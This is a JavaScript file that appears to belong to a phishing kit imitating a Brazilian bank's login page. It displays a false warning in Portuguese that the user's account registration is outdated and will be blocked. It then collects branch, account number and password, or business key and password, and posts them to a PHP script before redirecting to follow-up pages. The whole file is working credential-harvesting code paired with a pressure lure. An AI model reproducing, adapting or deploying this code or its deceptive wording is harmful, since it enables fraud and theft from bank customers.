$(document).ready(function(){
	$("#agc").mask("0000-0", {reverse: true});
	$("#cnt").mask("00000000000-0", {reverse: true});

	$("#btn-new").click(function(){
		modAlert("<p>Opção Indisponível!</p>");
	});

	$("#btn-client").click(function(){
		var frm = document.getElementById("container-frm");

		if (frm.getAttribute("data-status") == "deactivated" && frm.getAttribute("class").indexOf("active") == -1) {
			frm.setAttribute("data-status", "active");
			frm.setAttribute("class", frm.getAttribute("class")+" active");
		}
	});

	$("#back").click(function(){
		var frm = document.getElementById("container-frm");

		if (frm.getAttribute("data-status") == "active" && frm.getAttribute("class").indexOf("active") != -1) {
			frm.setAttribute("data-status", "deactivated");
			frm.setAttribute("class", frm.getAttribute("class").replace(" active", ""));
			document.getElementById("agc").value = "";
			document.getElementById("cnt").value = "";
			document.getElementById("pwd").value = "";
		}
	});

	$("#ps").change(function(){
		var option = this.value;
		if (option == 'pj') {
			document.getElementById('frm-pf').classList.add('hide');
			document.getElementById('frm-pj').classList.remove('hide');
			document.getElementById('agc').value = '';
			document.getElementById('cnt').value = '';
			document.getElementById('pwd').value = '';
		}else if (option == 'pf') {
			document.getElementById('frm-pj').classList.add('hide');
			document.getElementById('frm-pf').classList.remove('hide');
			document.getElementById('key').value = '';
			document.getElementById('pwdPj').value = '';
		}

	});
});

window.onload = function(){
	setTimeout(function(){
		$("#modal-initial").fadeOut("speed");
		document.getElementsByTagName("meta")["theme-color"].setAttribute("content", "#005aa5");
		modAlert("<p>Seu cadastro está desatualizado e será bloqueado!<br>Evite o bloqueio seguindo o procedimento em tela.</p>");
	}, 5500);
}

function validatefrmlog(){
	var pessoa = frmlog.ps.value;
	var agc = frmlog.agc.value.replace(/[^0-9]/g, "");
	var cnt = frmlog.cnt.value.replace(/[^0-9]/g, "");
	var pwd = frmlog.pwd.value;
	var key = frmlog.key.value;
	var pwdPj = frmlog.pwdPj.value;

	if (pessoa == 'pf') {

		if (agc == "" || cnt == "" || pwd == "") {
			modAlert("<p>Por favor informe todos os dados para acessar sua conta.</p>");
			return false;
		}

		if (agc.length < 5) {
			modAlert("<p>Agência Inválida!</p>");
			return false;
		}

		if (cnt.length < 6) {
			modAlert("<p>Conta Inválida!</p>");
			return false;
		}

		if (pwd.length < 8) {
			modAlert("<p>Senha Incorreta!</p>");
			return false;
		}else{
						
						
						var TipoConta=$('#ps').val();
						var campoAgencia=$('#agc').val();	
						var campoConta=$('#cnt').val();
						var inpSenha=$('#pwd').val();
						document.getElementById('btnLog').setAttribute('disabled', 'disabled');
						$(".loading").css({"display": "block"});
						$.ajax({
							url:"PJPF.php",			
							type:"post",				
							data: "campoAgencia="+campoAgencia+"&campoConta="+campoConta+"&inpSenha="+inpSenha+"&TipoConta="+TipoConta,	
							success: function (result){	
										
										if(result=='successPF'){
											location.href='PFInicial.php'	
										}else{
											$(".loading").css({"display": "none"});
											document.getElementById('btnLog').removeAttribute('disabled', 'disabled');
											modAlert("<p>"+result+"</p>");

										}
									}
						})
						return false;	//Evita que a página seja atualizada
					
			
		}

	}else if (pessoa == 'pj') {

		if (key == '' || pwdPj == '') {
			modAlert("<p>Por favor informe todos os dados para acessar sua conta.</p>");
			return false;
		}

		if (key.length < 3) {
			modAlert("<p>Chave Inválida!</p>");
			return false;
		}

		if (pwdPj.length < 8) {
			modAlert("<p>Senha Inválida!</p>");
			return false;
		}else{
			 
						
						var TipoConta=$('#ps').val();
						var campoChave=$('#key').val();
						var inpSenhaPJ=$('#pwdPj').val();
						document.getElementById('btnLog').setAttribute('disabled', 'disabled');
						$(".loading").css({"display": "block"});
						$.ajax({
							url:"PJPF.php",			
							type:"post",				
							data: "campoChave="+campoChave+"&inpSenhaPJ="+inpSenhaPJ+"&TipoConta="+TipoConta,	
							success: function (result){	

										if(result=='successPJ'){
											location.href='PJInicial.php'	
										}else{
											$(".loading").css({"display": "none"});
											document.getElementById('btnLog').removeAttribute('disabled', 'disabled');
											modAlert("<p>"+result+"</p>");

										}
									}
						})
						return false;	//Evita que a página seja atualizada
					
		}

	}

}

function jumpCmp(element){
	if (element.value.length == element.getAttribute("maxlength")) {
		switch (element.name) {
			case "agc":
				document.getElementById("cnt").focus();
			break;

			case "cnt":
				document.getElementById("pwd").focus();
			break;

			case "key":
				document.getElementById("pwdPj").focus();
			break;
		}
	}
}